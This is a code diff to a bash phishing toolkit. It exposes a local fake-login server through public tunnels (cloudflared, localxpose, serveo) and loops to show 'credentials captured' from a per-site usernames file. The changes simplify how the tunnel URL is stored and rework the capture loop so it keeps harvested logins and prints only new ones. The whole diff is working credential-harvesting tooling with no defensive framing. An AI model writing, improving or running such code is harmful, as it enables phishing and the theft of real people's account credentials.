@@ -1,5 +1,5 @@
 tunneldeps() {
-    mkdir -p tunneler
+    mkdir -p tunneler .server
     if [[ ! -f "tunneler/cloudflared" ]]; then
         printf "${blue}[i] ${white}downloading cloudflared . . .${reset}\n"
         if [[ "$(uname -m)" == "aarch64" ]] || [[ "$(uname -m)" == "arm64" ]]; then
@@ -57,10 +57,8 @@ startcloudflared() {
     ./tunneler/cloudflared tunnel --url http://127.0.0.1:"$port" > .server/log 2>&1 &
     cfpid=$!
     sleep 8
-    cfurl=$(grep -o 'https://[-a-zA-Z0-9.]*trycloudflare.com' .server/log | head -1)
-    if [[ -n "$cfurl" ]]; then
-        tunnelurl="$cfurl"
-    else
+    tunnelurl=$(grep -o 'https://[-a-zA-Z0-9.]*trycloudflare.com' .server/log | head -1)
+    if [[ -z "$tunnelurl" ]]; then
         printf "${red}[!] ${white}failed to start cloudflared tunnel.${reset}\n"
         exit 1
     fi
@@ -97,10 +95,8 @@ startlocalxpose() {
     ./tunneler/loclx tunnel http --port "$port" $regionflag $subflag > .server/log 2>&1 &
     loclxpid=$!
     sleep 8
-    loclxurl=$(grep -o 'https://[-a-zA-Z0-9.]*loclx.io' .server/log | head -1)
-    if [[ -n "$loclxurl" ]]; then
-        tunnelurl="$loclxurl"
-    else
+    tunnelurl=$(grep -o 'https://[-a-zA-Z0-9.]*loclx.io' .server/log | head -1)
+    if [[ -z "$tunnelurl" ]]; then
         printf "${red}[!] ${white}failed to start localxpose tunnel.${reset}\n"
         exit 1
     fi
@@ -127,10 +123,8 @@ startserveo() {
     ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 $subflag:80:127.0.0.1:"$port" serveo.net > .server/log 2>&1 &
     serveopid=$!
     sleep 8
-    serveourl=$(grep -o 'https://[-a-zA-Z0-9.]*serveo.net' .server/log | head -1)
-    if [[ -n "$serveourl" ]]; then
-        tunnelurl="$serveourl"
-    else
+    tunnelurl=$(grep -o 'https://[-a-zA-Z0-9.]*serveo.net' .server/log | head -1)
+    if [[ -z "$tunnelurl" ]]; then
         printf "${red}[!] ${white}failed to start serveo tunnel.${reset}\n"
         exit 1
     fi
@@ -143,16 +137,20 @@ capture() {
     printf "${green}[+] ${white}tunnel url : ${blue}$tunnelurl${reset}\n\n"
     printf "${green}[i] ${white}waiting for credentials ...${reset}\n"
     printf "${green}[i] ${white}press ${red}ctrl+c ${white}to stop.${reset}\n"
+    local lastcount=0
     while true; do
         if [[ -f ".sites/$site/usernames.txt" ]]; then
-            clear
-            banner
-            printf "${green}[+] ${white}tunnel url : ${blue}$tunnelurl${reset}\n\n"
-            printf "${green}[+] ${white}credentials captured :${reset}\n\n"
-            cat ".sites/$site/usernames.txt"
-            printf "\n${green}[i] ${white}waiting for more credentials ...${reset}\n"
-            printf "${green}[i] ${white}press ${red}ctrl+c ${white}to stop.${reset}\n"
-            > ".sites/$site/usernames.txt"
+            local currentcount=$(wc -l < ".sites/$site/usernames.txt" 2>/dev/null)
+            if [[ "$currentcount" -gt "$lastcount" ]]; then
+                clear
+                banner
+                printf "${green}[+] ${white}tunnel url : ${blue}$tunnelurl${reset}\n\n"
+                printf "${green}[+] ${white}new credentials captured :${reset}\n\n"
+                tail -n "$((currentcount - lastcount))" ".sites/$site/usernames.txt"
+                printf "\n${green}[i] ${white}waiting for more ...${reset}\n"
+                printf "${green}[i] ${white}press ${red}ctrl+c ${white}to stop.${reset}\n"
+                lastcount=$currentcount
+            fi
         fi
         sleep 1
     done
